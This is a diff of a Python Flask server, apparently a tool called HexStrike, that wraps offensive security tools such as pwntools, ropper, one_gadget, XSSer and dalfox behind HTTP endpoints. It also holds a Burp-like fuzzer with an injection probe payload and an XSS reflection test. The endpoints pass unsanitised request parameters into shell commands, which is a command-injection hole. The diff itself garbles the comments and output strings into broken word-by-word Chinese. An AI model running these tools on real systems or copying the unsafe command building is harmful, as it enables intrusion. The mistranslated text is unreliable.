             return jsonify({"error": "Binary parameter is required"}), 400
 
-        # Create Ghidra project directory
+        # 创建 Ghidra project 目录
         project_dir = f"/tmp/ghidra_projects/{project_name}"
         os.makedirs(project_dir, exist_ok=True)
 
-        # Base Ghidra command for headless analysis
+        # Base Ghidra 命令 用于 headless 分析
         command = f"analyzeHeadless {project_dir} {project_name} -import {binary} -deleteProject"
 
         if script_file:
@@ -12321,43 +12321,43 @@ def ghidra():
 
 @app.route("/api/tools/pwntools", methods=["POST"])
 def pwntools():
-    """Execute Pwntools for exploit development and automation"""
+    """执行 Pwntools 用于 利用 development 与 automation"""
     try:
         params = request.json
         script_content = params.get("script_content", "")
         target_binary = params.get("target_binary", "")
         target_host = params.get("target_host", "")
         target_port = params.get("target_port", 0)
-        exploit_type = params.get("exploit_type", "local")  # local, remote, format_string, rop
+        exploit_type = params.get("exploit_type", "local")  # 本地, remote, format_string, rop
         additional_args = params.get("additional_args", "")
 
         if not script_content and not target_binary:
             logger.warning(" Pwntools called without script content or target binary")
             return jsonify({"error": "Script content or target binary is required"}), 400
 
-        # Create temporary Python script
+        # 创建 temporary Python script
         script_file = "/tmp/pwntools_exploit.py"
 
         if script_content:
-            # Use provided script content
+            # 说明：Use provided script content
             with open(script_file, "w") as f:
                 f.write(script_content)
         else:
-            # Generate basic exploit template
+            # 生成 基础 利用 template
             template = f"""#!/usr/bin/env python3
 from pwn import *
 
-# Configuration
+# 说明：Configuration
 context.arch = 'amd64'
 context.os = 'linux'
 context.log_level = 'info'
 
-# Target configuration
+# 目标 configuration
 binary = '{target_binary}' if '{target_binary}' else None
 host = '{target_host}' if '{target_host}' else None
 port = {target_port} if {target_port} else None
 
-# Exploit logic
+# 利用 logic
 if binary:
     p = process(binary)
     log.info(f"Started local process: {{binary}}")
@@ -12368,7 +12368,7 @@ else:
     log.error("No target specified")
     exit(1)
 
-# Basic interaction
+# 基础 interaction
 p.interactive()
 """
             with open(script_file, "w") as f:
@@ -12382,7 +12382,7 @@ p.interactive()
         logger.info(f" Starting Pwntools exploit: {exploit_type}")
         result = execute_command(command)
 
-        # Cleanup
+        # 说明：Cleanup
         try:
             os.remove(script_file)
         except:
@@ -12396,11 +12396,11 @@ p.interactive()
 
 @app.route("/api/tools/one-gadget", methods=["POST"])
 def one_gadget():
-    """Execute one_gadget to find one-shot RCE gadgets in libc"""
+    """执行 one_gadget 到 find one-shot RCE gadgets 在 libc"""
     try:
         params = request.json
         libc_path = params.get("libc_path", "")
-        level = params.get("level", 1)  # 0, 1, 2 for different constraint levels
+        level = params.get("level", 1)  # 0, 1, 2 用于 different constraint levels
         additional_args = params.get("additional_args", "")
 
         if not libc_path:
@@ -12422,11 +12422,11 @@ def one_gadget():
 
 @app.route("/api/tools/libc-database", methods=["POST"])
 def libc_database():
-    """Execute libc-database for libc identification and offset lookup"""
+    """执行 libc-database 用于 libc identification 与 offset lookup"""
     try:
         params = request.json
-        action = params.get("action", "find")  # find, dump, download
-        symbols = params.get("symbols", "")  # format: "symbol1:offset1 symbol2:offset2"
+        action = params.get("action", "find")  # 说明：find, dump, download
+        symbols = params.get("symbols", "")  # format: 说明："symbol1:offset1 symbol2:offset2"
         libc_id = params.get("libc_id", "")
         additional_args = params.get("additional_args", "")
 
@@ -12438,7 +12438,7 @@ def libc_database():
             logger.warning(" libc-database called without libc_id for dump/download")
             return jsonify({"error": "libc_id parameter is required for dump/download actions"}), 400
 
-        # Navigate to libc-database directory (assuming it's installed)
+        # Navigate 到 libc-database 目录 (assuming it's installed)
         base_command = "cd /opt/libc-database 2>/dev/null || cd ~/libc-database 2>/dev/null || echo 'libc-database not found'"
 
         if action == "find":
@@ -12463,7 +12463,7 @@ def libc_database():
 
 @app.route("/api/tools/gdb-peda", methods=["POST"])
 def gdb_peda():
-    """Execute GDB with PEDA for enhanced debugging and exploitation"""
+    """执行 GDB 使用 PEDA 用于 增强 debugging 与 exploitation"""
     try:
         params = request.json
         binary = params.get("binary", "")
@@ -12476,7 +12476,7 @@ def gdb_peda():
             logger.warning(" GDB-PEDA called without binary, PID, or core file")
             return jsonify({"error": "Binary, PID, or core file parameter is required"}), 400
 
-        # Base GDB command with PEDA
+        # Base GDB 命令 使用 PEDA
         command = "gdb -q"
 
         if binary:
@@ -12488,7 +12488,7 @@ def gdb_peda():
         if attach_pid:
             command += f" -p {attach_pid}"
 
-        # Create command script
+        # 创建 命令 script
         if commands:
             temp_script = "/tmp/gdb_peda_commands.txt"
             peda_commands = f"""
@@ -12500,7 +12500,7 @@ quit
                 f.write(peda_commands)
             command += f" -x {temp_script}"
         else:
-            # Default PEDA initialization
+            # 默认 PEDA 初始化
             command += " -ex 'source ~/peda/peda.py' -ex 'quit'"
 
         if additional_args:
@@ -12510,7 +12510,7 @@ quit
         logger.info(f" Starting GDB-PEDA analysis: {target_info}")
         result = execute_command(command)
 
-        # Cleanup
+        # 说明：Cleanup
         if commands and os.path.exists("/tmp/gdb_peda_commands.txt"):
             try:
                 os.remove("/tmp/gdb_peda_commands.txt")
@@ -12525,70 +12525,70 @@ quit
 
 @app.route("/api/tools/angr", methods=["POST"])
 def angr():
-    """Execute angr for symbolic execution and binary analysis"""
+    """执行 angr 用于 symbolic execution 与 二进制 分析"""
     try:
         params = request.json
         binary = params.get("binary", "")
         script_content = params.get("script_content", "")
         find_address = params.get("find_address", "")
         avoid_addresses = params.get("avoid_addresses", "")
-        analysis_type = params.get("analysis_type", "symbolic")  # symbolic, cfg, static
+        analysis_type = params.get("analysis_type", "symbolic")  # 说明：symbolic, cfg, static
         additional_args = params.get("additional_args", "")
 
         if not binary:
             logger.warning(" angr called without binary parameter")
             return jsonify({"error": "Binary parameter is required"}), 400
 
-        # Create angr script
+        # 创建 angr script
         script_file = "/tmp/angr_analysis.py"
 
         if script_content:
             with open(script_file, "w") as f:
                 f.write(script_content)
         else:
-            # Generate basic angr template
+            # 生成 基础 angr template
             template = f"""#!/usr/bin/env python3
 import angr
 import sys
 
-# Load binary
+# 说明：Load binary
 project = angr.Project('{binary}', auto_load_libs=False)
-print(f"Loaded binary: {binary}")
-print(f"Architecture: {{project.arch}}")
-print(f"Entry point: {{hex(project.entry)}}")
+print(f"已加载二进制：{binary}")
+print(f"架构：{{project.arch}}")
+print(f"入口点：{{hex(project.entry)}}")
 
 """
             if analysis_type == "symbolic":
                 template += f"""
-# Symbolic execution
+# Symbolic 执行
 state = project.factory.entry_state()
 simgr = project.factory.simulation_manager(state)
 
-# Find and avoid addresses
+# 说明：Find and avoid addresses
 find_addr = {find_address if find_address else 'None'}
 avoid_addrs = {avoid_addresses.split(',') if avoid_addresses else '[]'}
 
 if find_addr:
     simgr.explore(find=find_addr, avoid=avoid_addrs)
     if simgr.found:
-        print("Found solution!")
+        print("发现 解!")
         solution_state = simgr.found[0]
-        print(f"Input: {{solution_state.posix.dumps(0)}}")
+        print(f"输入：{{solution_state.posix.dumps(0)}}")
     else:
-        print("No solution found")
+        print("未 解 发现")
 else:
-    print("No find address specified, running basic analysis")
+    print("未 未指定查找地址，正在执行基础分析")
 """
             elif analysis_type == "cfg":
                 template += """
-# Control Flow Graph analysis
+# Control Flow Graph 分析
 cfg = project.analyses.CFGFast()
-print(f"CFG nodes: {len(cfg.graph.nodes())}")
-print(f"CFG edges: {len(cfg.graph.edges())}")
+print(f"CFG 节点数：{len(cfg.graph.nodes())}")
+print(f"CFG 边数：{len(cfg.graph.edges())}")
 
-# Function analysis
+# Function 分析
 for func_addr, func in cfg.functions.items():
-    print(f"Function: {func.name} at {hex(func_addr)}")
+    print(f"函数：{func.name} 位于 {hex(func_addr)}")
 """
 
             with open(script_file, "w") as f:
@@ -12600,9 +12600,9 @@ for func_addr, func in cfg.functions.items():
             command += f" {additional_args}"
 
         logger.info(f" Starting angr analysis: {binary}")
-        result = execute_command(command, timeout=600)  # Longer timeout for symbolic execution
+        result = execute_command(command, timeout=600)  # Longer 超时 用于 symbolic execution
 
-        # Cleanup
+        # 说明：Cleanup
         try:
             os.remove(script_file)
         except:
@@ -12616,13 +12616,13 @@ for func_addr, func in cfg.functions.items():
 
 @app.route("/api/tools/ropper", methods=["POST"])
 def ropper():
-    """Execute ropper for advanced ROP/JOP gadget searching"""
+    """执行 ropper 用于 高级 ROP/JOP gadget searching"""
     try:
         params = request.json
         binary = params.get("binary", "")
-        gadget_type = params.get("gadget_type", "rop")  # rop, jop, sys, all
-        quality = params.get("quality", 1)  # 1-5, higher = better quality
-        arch = params.get("arch", "")  # x86, x86_64, arm, etc.
+        gadget_type = params.get("gadget_type", "rop")  # rop, jop, sys, 全部
+        quality = params.get("quality", 1)  # 说明：1-5, higher = better quality
+        arch = params.get("arch", "")  # 说明：x86, x86_64, arm, etc.
         search_string = params.get("search_string", "")
         additional_args = params.get("additional_args", "")
 
@@ -12663,13 +12663,13 @@ def ropper():
 
 @app.route("/api/tools/pwninit", methods=["POST"])
 def pwninit():
-    """Execute pwninit for CTF binary exploitation setup"""
+    """执行 pwninit 用于 CTF 二进制 exploitation 初始化"""
     try:
         params = request.json
         binary = params.get("binary", "")
         libc = params.get("libc", "")
         ld = params.get("ld", "")
-        template_type = params.get("template_type", "python")  # python, c
+        template_type = params.get("template_type", "python")  # 说明：python, c
         additional_args = params.get("additional_args", "")
 
         if not binary:
@@ -12699,12 +12699,12 @@ def pwninit():
         return jsonify({"error": f"Server error: {str(e)}"}), 500
 
 # ============================================================================
-# ADDITIONAL WEB SECURITY TOOLS
+# 附加 WEB 安全 工具
 # ============================================================================
 
 @app.route("/api/tools/feroxbuster", methods=["POST"])
 def feroxbuster():
-    """Execute Feroxbuster for recursive content discovery with enhanced logging"""
+    """执行 Feroxbuster 用于 recursive content 发现 使用 增强日志"""
     try:
         params = request.json
         url = params.get("url", "")
@@ -12735,7 +12735,7 @@ def feroxbuster():
 
 @app.route("/api/tools/dotdotpwn", methods=["POST"])
 def dotdotpwn():
-    """Execute DotDotPwn for directory traversal testing with enhanced logging"""
+    """执行 DotDotPwn 用于 目录 traversal 测试 使用 增强日志"""
     try:
         params = request.json
         target = params.get("target", "")
@@ -12767,7 +12767,7 @@ def dotdotpwn():
 
 @app.route("/api/tools/xsser", methods=["POST"])
 def xsser():
-    """Execute XSSer for XSS vulnerability testing with enhanced logging"""
+    """执行 XSSer 用于 XSS 漏洞 测试 使用 增强日志"""
     try:
         params = request.json
         url = params.get("url", "")
@@ -12800,7 +12800,7 @@ def xsser():
 
 @app.route("/api/tools/wfuzz", methods=["POST"])
 def wfuzz():
-    """Execute Wfuzz for web application fuzzing with enhanced logging"""
+    """执行 Wfuzz 用于 web application fuzzing 使用 增强日志"""
     try:
         params = request.json
         url = params.get("url", "")
@@ -12829,12 +12829,12 @@ def wfuzz():
         }), 500
 
 # ============================================================================
-# ENHANCED WEB APPLICATION SECURITY TOOLS (v6.0)
+# 增强 WEB APPLICATION 安全 工具 (v6.0)
 # ============================================================================
 
 @app.route("/api/tools/dirsearch", methods=["POST"])
 def dirsearch():
-    """Execute Dirsearch for advanced directory and file discovery with enhanced logging"""
+    """执行 Dirsearch 用于 高级 目录 与 文件 发现 使用 增强日志"""
     try:
         params = request.json
         url = params.get("url", "")
@@ -12866,7 +12866,7 @@ def dirsearch():
 
 @app.route("/api/tools/katana", methods=["POST"])
 def katana():
-    """Execute Katana for next-generation crawling and spidering with enhanced logging"""
+    """执行 Katana 用于 next-generation crawling 与 spidering 使用 增强日志"""
     try:
         params = request.json
         url = params.get("url", "")
@@ -12904,7 +12904,7 @@ def katana():
 
 @app.route("/api/tools/gau", methods=["POST"])
 def gau():
-    """Execute Gau (Get All URLs) for URL discovery from multiple sources with enhanced logging"""
+    """执行 Gau (获取 全部 URLs) 用于 URL 发现 来自 multiple sources 使用 增强日志"""
     try:
         params = request.json
         domain = params.get("domain", "")
@@ -12941,7 +12941,7 @@ def gau():
 
 @app.route("/api/tools/waybackurls", methods=["POST"])
 def waybackurls():
-    """Execute Waybackurls for historical URL discovery with enhanced logging"""
+    """执行 Waybackurls 用于 historical URL 发现 使用 增强日志"""
     try:
         params = request.json
         domain = params.get("domain", "")
@@ -12974,7 +12974,7 @@ def waybackurls():
 
 @app.route("/api/tools/arjun", methods=["POST"])
 def arjun():
-    """Execute Arjun for HTTP parameter discovery with enhanced logging"""
+    """执行 Arjun 用于 HTTP 参数 发现 使用 增强日志"""
     try:
         params = request.json
         url = params.get("url", "")
@@ -13013,7 +13013,7 @@ def arjun():
 
 @app.route("/api/tools/paramspider", methods=["POST"])
 def paramspider():
-    """Execute ParamSpider for parameter mining from web archives with enhanced logging"""
+    """执行 ParamSpider 用于 参数 mining 来自 web archives 使用 增强日志"""
     try:
         params = request.json
         domain = params.get("domain", "")
@@ -13047,7 +13047,7 @@ def paramspider():
 
 @app.route("/api/tools/x8", methods=["POST"])
 def x8():
-    """Execute x8 for hidden parameter discovery with enhanced logging"""
+    """执行 x8 用于 hidden 参数 发现 使用 增强日志"""
     try:
         params = request.json
         url = params.get("url", "")
@@ -13082,7 +13082,7 @@ def x8():
 
 @app.route("/api/tools/jaeles", methods=["POST"])
 def jaeles():
-    """Execute Jaeles for advanced vulnerability scanning with custom signatures"""
+    """执行 Jaeles 用于 高级 漏洞 扫描 使用 custom signatures"""
     try:
         params = request.json
         url = params.get("url", "")
@@ -13117,7 +13117,7 @@ def jaeles():
 
 @app.route("/api/tools/dalfox", methods=["POST"])
 def dalfox():
-    """Execute Dalfox for advanced XSS vulnerability scanning with enhanced logging"""
+    """执行 Dalfox 用于 高级 XSS 漏洞 扫描 使用 增强日志"""
     try:
         params = request.json
         url = params.get("url", "")
@@ -13162,7 +13162,7 @@ def dalfox():
 
 @app.route("/api/tools/httpx", methods=["POST"])
 def httpx():
-    """Execute httpx for fast HTTP probing and technology detection"""
+    """执行 httpx 用于 fast HTTP probing 与 technology detection"""
     try:
         params = request.json
         target = params.get("target", "")
@@ -13212,7 +13212,7 @@ def httpx():
 
 @app.route("/api/tools/anew", methods=["POST"])
 def anew():
-    """Execute anew for appending new lines to files (useful for data processing)"""
+    """执行 anew 用于 appending new lines 到 文件 (useful 用于 data processing)"""
     try:
         params = request.json
         input_data = params.get("input_data", "")
@@ -13241,7 +13241,7 @@ def anew():
 
 @app.route("/api/tools/qsreplace", methods=["POST"])
 def qsreplace():
-    """Execute qsreplace for query string parameter replacement"""
+    """执行 qsreplace 用于 query string 参数 replacement"""
     try:
         params = request.json
         urls = params.get("urls", "")
@@ -13267,7 +13267,7 @@ def qsreplace():
 
 @app.route("/api/tools/uro", methods=["POST"])
 def uro():
-    """Execute uro for filtering out similar URLs"""
+    """执行 uro 用于 filtering out similar URLs"""
     try:
         params = request.json
         urls = params.get("urls", "")
@@ -13299,15 +13299,15 @@ def uro():
         return jsonify({"error": f"Server error: {str(e)}"}), 500
 
 # ============================================================================
-# ADVANCED WEB SECURITY TOOLS CONTINUED
+# 高级 WEB 安全 工具 CONTINUED
 # ============================================================================
 
 # ============================================================================
-# ENHANCED HTTP TESTING FRAMEWORK (BURP SUITE ALTERNATIVE)
+# 增强 HTTP 测试 框架 (BURP SUITE ALTERNATIVE)
 # ============================================================================
 
 class HTTPTestingFramework:
-    """Advanced HTTP testing framework as Burp Suite alternative"""
+    """高级 HTTP 测试 框架 as Burp Suite alternative"""
 
     def __init__(self):
         self.session = requests.Session()
@@ -13316,12 +13316,12 @@ class HTTPTestingFramework:
         })
         self.proxy_history = []
         self.vulnerabilities = []
-        self.match_replace_rules = []  # [{'where':'query|headers|body|url','pattern':'regex','replacement':'str'}]
-        self.scope = None  # {'host': 'example.com', 'include_subdomains': True}
+        self.match_replace_rules = []  # [{'where':'query|请求头|body|URL','pattern':'regex','replacement':'str'}]
+        self.scope = None  # {'host': '示例.com', 'include_subdomains': True}
         self._req_id = 0
 
     def setup_proxy(self, proxy_port: int = 8080):
-        """Setup HTTP proxy for request interception"""
+        """初始化 HTTP 代理 用于 请求 interception"""
         self.session.proxies = {
             'http': f'http://127.0.0.1:{proxy_port}',
             'https': f'http://127.0.0.1:{proxy_port}'
@@ -13329,14 +13329,14 @@ class HTTPTestingFramework:
 
     def intercept_request(self, url: str, method: str = 'GET', data: dict = None,
                          headers: dict = None, cookies: dict = None) -> dict:
-        """Intercept and analyze HTTP requests"""
+        """Intercept 与 分析 HTTP 请求"""
         try:
             if headers:
                 self.session.headers.update(headers)
             if cookies:
                 self.session.cookies.update(cookies)
 
-            # Apply match/replace rules prior to sending
+            # Apply match/replace rules prior 到 sending
             url, data, send_headers = self._apply_match_replace(url, data, dict(self.session.headers))
             if headers:
                 send_headers.update(headers)
@@ -13352,7 +13352,7 @@ class HTTPTestingFramework:
             else:
                 response = self.session.request(method, url, data=data, headers=send_headers, timeout=30)
 
-            # Store request/response in history
+            # Store 请求/响应 在 history
             self._req_id += 1
             request_data = {
                 'id': self._req_id,
@@ -13366,7 +13366,7 @@ class HTTPTestingFramework:
             response_data = {
                 'status_code': response.status_code,
                 'headers': dict(response.headers),
-                'content': response.text[:10000],  # Limit content size
+                'content': response.text[:10000],  # 说明：Limit content size
                 'size': len(response.content),
                 'time': response.elapsed.total_seconds()
             }
@@ -13376,7 +13376,7 @@ class HTTPTestingFramework:
                 'response': response_data
             })
 
-            # Analyze for vulnerabilities
+            # 分析 用于 漏洞
             self._analyze_response_for_vulns(url, response)
 
             return {
@@ -13390,9 +13390,9 @@ class HTTPTestingFramework:
             logger.error(f"{ModernVisualEngine.format_error_card('ERROR', 'HTTP-Framework', str(e))}")
             return {'success': False, 'error': str(e)}
 
-    # ----------------- Match & Replace and Scope -----------------
+    # ----------------- Match & Replace 与 Scope -----------------
     def set_match_replace_rules(self, rules: list):
-        """Set match/replace rules. Each rule: {'where','pattern','replacement'}"""
+        """设置 match/replace rules. Each rule: {'where','pattern','replacement'}"""
         self.match_replace_rules = rules or []
 
     def set_scope(self, host: str, include_subdomains: bool = True):
@@ -13446,15 +13446,15 @@ class HTTPTestingFramework:
                         out_data = re.sub(pattern, repl, out_data)
             except Exception:
                 continue
-        # Ensure scope restriction
+        # 说明：Ensure scope restriction
         if not self._in_scope(url):
             logger.warning(f"{ModernVisualEngine.format_tool_status('HTTP-Framework', 'SKIPPED', f'Out of scope: {url}')}" )
             return original_url, data, headers
         return url, out_data, out_headers
 
-    # ----------------- Repeater (custom send) -----------------
+    # 说明：----------------- Repeater (custom send) -----------------
     def send_custom_request(self, request_spec: dict) -> dict:
-        """Send a custom request with explicit fields, applying rules."""
+        """Send a custom 请求 使用 explicit fields, applying rules."""
         url = request_spec.get('url','')
         method = request_spec.get('method','GET')
         headers = request_spec.get('headers') or {}
@@ -13462,11 +13462,11 @@ class HTTPTestingFramework:
         data = request_spec.get('data')
         return self.intercept_request(url, method, data, headers, cookies)
 
-    # ----------------- Intruder (Sniper mode) -----------------
+    # ----------------- Intruder (Sniper 模式) -----------------
     def intruder_sniper(self, url: str, method: str = 'GET', location: str = 'query',
                         params: list = None, payloads: list = None, base_data: dict = None,
                         max_requests: int = 100) -> dict:
-        """Simple fuzzing: iterate payloads over each parameter individually (Sniper)."""
+        """简单 fuzzing: iterate payloads over each 参数 individually (Sniper)."""
         from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse
         params = params or []
         payloads = payloads or ["'\"<>`, ${7*7}"]
@@ -13516,10 +13516,10 @@ class HTTPTestingFramework:
         }
 
     def _analyze_response_for_vulns(self, url: str, response):
-        """Analyze HTTP response for common vulnerabilities"""
+        """分析 HTTP 响应 用于 常见 漏洞"""
         vulns = []
 
-        # Check for missing security headers
+        # 检查 用于 missing 安全 请求头
         security_headers = {
             'X-Frame-Options': 'Clickjacking protection missing',
             'X-Content-Type-Options': 'MIME type sniffing protection missing',
@@ -13538,7 +13538,7 @@ class HTTPTestingFramework:
                     'header': header
                 })
 
-        # Check for sensitive information disclosure
+        # 检查 用于 sensitive information disclosure
         sensitive_patterns = [
             (r'password\s*[:=]\s*["\']?([^"\'\s]+)', 'Password disclosure'),
             (r'api[_-]?key\s*[:=]\s*["\']?([^"\'\s]+)', 'API key disclosure'),
@@ -13554,10 +13554,10 @@ class HTTPTestingFramework:
                     'severity': 'high',
                     'description': description,
                     'url': url,
-                    'matches': matches[:5]  # Limit matches
+                    'matches': matches[:5]  # 说明：Limit matches
                 })
 
-        # Check for SQL injection indicators
+        # 检查 用于 SQL injection indicators
         sql_errors = [
             'SQL syntax error',
             'mysql_fetch_array',
@@ -13578,11 +13578,11 @@ class HTTPTestingFramework:
         self.vulnerabilities.extend(vulns)
 
     def _get_recent_vulns(self, limit: int = 10):
-        """Get recent vulnerabilities found"""
+        """获取 最近 漏洞 found"""
         return self.vulnerabilities[-limit:] if self.vulnerabilities else []
 
     def spider_website(self, base_url: str, max_depth: int = 3, max_pages: int = 100) -> dict:
-        """Spider website to discover endpoints and forms"""
+        """Spider website 到 discover 端点 与 forms"""
         try:
             discovered_urls = set()
             forms = []
@@ -13602,10 +13602,10 @@ class HTTPTestingFramework:
                     if response.status_code == 200:
                         discovered_urls.add(current_url)
 
-                        # Parse HTML for links and forms
+                        # 解析 HTML 用于 links 与 forms
                         soup = BeautifulSoup(response.text, 'html.parser')
 
-                        # Find all links
+                        # Find 全部 links
                         for link in soup.find_all('a', href=True):
                             href = link['href']
                             full_url = urljoin(current_url, href)
@@ -13614,7 +13614,7 @@ class HTTPTestingFramework:
                                 if full_url not in visited and depth < max_depth:
                                     to_visit.append((full_url, depth + 1))
 
-                        # Find all forms
+                        # Find 全部 forms
                         for form in soup.find_all('form'):
                             form_data = {
                                 'url': current_url,
@@ -13649,7 +13649,7 @@ class HTTPTestingFramework:
             return {'success': False, 'error': str(e)}
 
 class BrowserAgent:
-    """AI-powered browser agent for web application testing and inspection"""
+    """AI-powered 浏览器 agent 用于 web application 测试 与 inspection"""
 
     def __init__(self):
         self.driver = None
@@ -13658,7 +13658,7 @@ class BrowserAgent:
         self.network_logs = []
 
     def setup_browser(self, headless: bool = True, proxy_port: int = None):
-        """Setup Chrome browser with security testing options"""
+        """初始化 Chrome 浏览器 使用 安全 测试 options"""
         try:
             chrome_options = Options()
 
@@ -13671,11 +13671,11 @@ class BrowserAgent:
             chrome_options.add_argument('--window-size=1920,1080')
             chrome_options.add_argument('--user-agent=HexStrike-BrowserAgent/1.0 (Security Testing)')
 
-            # Enable logging
+            # 启用 logging
             chrome_options.add_argument('--enable-logging')
             chrome_options.add_argument('--log-level=0')
 
-            # Security testing options
+            # 安全 测试 options
             chrome_options.add_argument('--disable-web-security')
             chrome_options.add_argument('--allow-running-insecure-content')
             chrome_options.add_argument('--ignore-certificate-errors')
@@ -13684,7 +13684,7 @@ class BrowserAgent:
             if proxy_port:
                 chrome_options.add_argument(f'--proxy-server=http://127.0.0.1:{proxy_port}')
 
-            # Enable network logging
+            # 启用 网络 logging
             chrome_options.set_capability('goog:loggingPrefs', {'performance': 'ALL'})
 
             self.driver = webdriver.Chrome(options=chrome_options)
@@ -13698,7 +13698,7 @@ class BrowserAgent:
             return False
 
     def navigate_and_inspect(self, url: str, wait_time: int = 5) -> dict:
-        """Navigate to URL and perform comprehensive inspection"""
+        """Navigate 到 URL 与 perform 综合 inspection"""
         try:
             if not self.driver:
                 if not self.setup_browser():
@@ -13707,24 +13707,24 @@ class BrowserAgent:
             nav_command = f'Navigate to {url}'
             logger.info(f"{ModernVisualEngine.format_command_execution(nav_command, 'STARTING')}")
 
-            # Navigate to URL
+            # Navigate 到 URL
             self.driver.get(url)
             time.sleep(wait_time)
 
-            # Take screenshot
+            # 说明：Take screenshot
             screenshot_path = f"/tmp/hexstrike_screenshot_{int(time.time())}.png"
             self.driver.save_screenshot(screenshot_path)
             self.screenshots.append(screenshot_path)
 
-            # Get page source
+            # 获取 page source
             page_source = self.driver.page_source
             self.page_sources.append({
                 'url': url,
-                'source': page_source[:50000],  # Limit size
+                'source': page_source[:50000],  # 说明：Limit size
                 'timestamp': datetime.now().isoformat()
             })
 
-            # Extract page information
+            # 说明：Extract page information
             page_info = {
                 'title': self.driver.title,
                 'url': self.driver.current_url,
@@ -13740,9 +13740,9 @@ class BrowserAgent:
                 'console_errors': self._get_console_errors()
             }
 
-            # Analyze for security issues
+            # 分析 用于 安全 issues
             security_analysis = self._analyze_page_security(page_source, page_info)
-            # Merge extended passive analysis
+            # 合并 extended passive 分析
             extended_passive = self._extended_passive_analysis(page_info, page_source)
             security_analysis['issues'].extend(extended_passive['issues'])
             security_analysis['total_issues'] = len(security_analysis['issues'])
@@ -13763,9 +13763,9 @@ class BrowserAgent:
             logger.error(f"{ModernVisualEngine.format_error_card('ERROR', 'BrowserAgent', str(e))}")
             return {'success': False, 'error': str(e)}
 
-    # ---------------------- Browser Deep Introspection Helpers ----------------------
+    # ---------------------- 浏览器 Deep Introspection Helpers ----------------------
     def _get_console_errors(self) -> list:
-        """Collect console errors & warnings (if supported)"""
+        """收集 console errors & warnings (如果 supported)"""
         try:
             logs = self.driver.get_log('browser')
             out = []
@@ -13781,14 +13781,14 @@ class BrowserAgent:
         issues = []
         for ck in cookies:
             name = ck.get('name','')
-            # Selenium cookie dict may lack flags; attempt JS check if not present
-            # (we keep lightweight – deeper flag detection requires CDP)
+            # Selenium Cookie dict may lack flags; attempt JS 检查 如果 not present
+            # (we keep 轻量 – deeper flag detection requires CDP)
             if name.lower() in ('sessionid','phpseSSID','jsessionid') and len(ck.get('value','')) < 16:
                 issues.append({'type':'weak_session_cookie','severity':'medium','description':f'Session cookie {name} appears short'})
         return issues
 
     def _analyze_security_headers(self, page_source: str, page_info: dict) -> list:
-        # We cannot directly read response headers via Selenium; attempt a lightweight fetch with requests
+        # We cannot directly read 响应 请求头 via Selenium; attempt a 轻量 fetch 使用 请求
         issues = []
         try:
             resp = requests.get(page_info.get('url',''), timeout=10, verify=False)
@@ -13803,7 +13803,7 @@ class BrowserAgent:
             for key, desc in required.items():
                 if key not in headers:
                     issues.append({'type':'missing_security_header','severity':'medium','description':desc,'header':key})
-            # Weak CSP heuristic
+            # 说明：Weak CSP heuristic
             csp = headers.get('content-security-policy','')
             if csp and "unsafe-inline" in csp:
                 issues.append({'type':'weak_csp','severity':'low','description':'CSP allows unsafe-inline scripts'})
@@ -13827,40 +13827,40 @@ class BrowserAgent:
     def _extended_passive_analysis(self, page_info: dict, page_source: str) -> dict:
         modules = []
         issues = []
-        # Cookies
+        # 说明：Cookie
         cookie_issues = self._analyze_cookies(page_info.get('cookies', []))
         if cookie_issues:
             issues.extend(cookie_issues); modules.append('cookie_analysis')
-        # Headers
+        # 请求头
         header_issues = self._analyze_security_headers(page_source, page_info)
         if header_issues:
             issues.extend(header_issues); modules.append('security_headers')
-        # Mixed content
+        # 说明：Mixed content
         mixed = self._detect_mixed_content(page_info)
         if mixed:
             issues.extend(mixed); modules.append('mixed_content')
-        # Console errors may hint at DOM XSS sinks
+        # 说明：Console errors may hint at DOM XSS sinks
         if page_info.get('console_errors'):
             modules.append('console_log_capture')
         return {'issues': issues, 'modules': modules}
 
     def run_active_tests(self, page_info: dict, payload: str = '<hexstrikeXSSTest123>') -> dict:
-        """Very lightweight active tests (reflection check) - safe mode.
-        Only GET forms with text inputs to avoid state-changing operations."""
+        """Very 轻量 active tests (reflection 检查) - safe 模式.
+        仅 获取 forms 使用 text inputs 到 avoid state-changing 操作."""
         findings = []
         tested = 0
         for form in page_info.get('forms', []):
             if form.get('method','GET').upper() != 'GET':
                 continue
             params = []
-            for inp in form.get('inputs', [])[:3]:  # limit
+            for inp in form.get('inputs', [])[:3]:  # 说明：limit
                 if inp.get('type','text') in ('text','search'):
                     params.append(f"{inp.get('name','param')}={payload}")
             if not params:
                 continue
             action = form.get('action') or page_info.get('url','')
             if action.startswith('/'):
-                # relative
+                # 说明：relative
                 base = page_info.get('url','')
                 try:
                     from urllib.parse import urljoin
@@ -13880,7 +13880,7 @@ class BrowserAgent:
         return {'active_findings': findings, 'tested_forms': tested}
 
     def _get_local_storage(self) -> dict:
-        """Extract local storage data"""
+        """Extract 本地 storage data"""
         try:
             return self.driver.execute_script("""
                 var storage = {};
@@ -13894,7 +13894,7 @@ class BrowserAgent:
             return {}
 
     def _get_session_storage(self) -> dict:
-        """Extract session storage data"""
+        """说明：Extract session storage data"""
         try:
             return self.driver.execute_script("""
                 var storage = {};
@@ -13908,7 +13908,7 @@ class BrowserAgent:
             return {}
 
     def _extract_forms(self) -> list:
-        """Extract all forms from the page"""
+        """Extract 全部 forms 来自 the page"""
         forms = []
         try:
             form_elements = self.driver.find_elements(By.TAG_NAME, 'form')
@@ -13934,16 +13934,16 @@ class BrowserAgent:
         return forms
 
     def _extract_links(self) -> list:
-        """Extract all links from the page"""
+        """Extract 全部 links 来自 the page"""
         links = []
         try:
             link_elements = self.driver.find_elements(By.TAG_NAME, 'a')
-            for link in link_elements[:50]:  # Limit to 50 links
+            for link in link_elements[:50]:  # Limit 到 50 links
                 href = link.get_attribute('href')
                 if href:
                     links.append({
                         'href': href,
-                        'text': link.text[:100]  # Limit text length
+                        'text': link.text[:100]  # 说明：Limit text length
                     })
         except:
             pass
@@ -13951,7 +13951,7 @@ class BrowserAgent:
         return links
 
     def _extract_inputs(self) -> list:
-        """Extract all input elements"""
+        """Extract 全部 输入 elements"""
         inputs = []
         try:
             input_elements = self.driver.find_elements(By.TAG_NAME, 'input')
@@ -13968,11 +13968,11 @@ class BrowserAgent:
         return inputs
 
     def _extract_scripts(self) -> list:
-        """Extract script sources and inline scripts"""
+        """Extract script sources 与 inline scripts"""
         scripts = []
         try:
             script_elements = self.driver.find_elements(By.TAG_NAME, 'script')
-            for script in script_elements[:20]:  # Limit to 20 scripts
+            for script in script_elements[:20]:  # Limit 到 20 scripts
                 src = script.get_attribute('src')
                 if src:
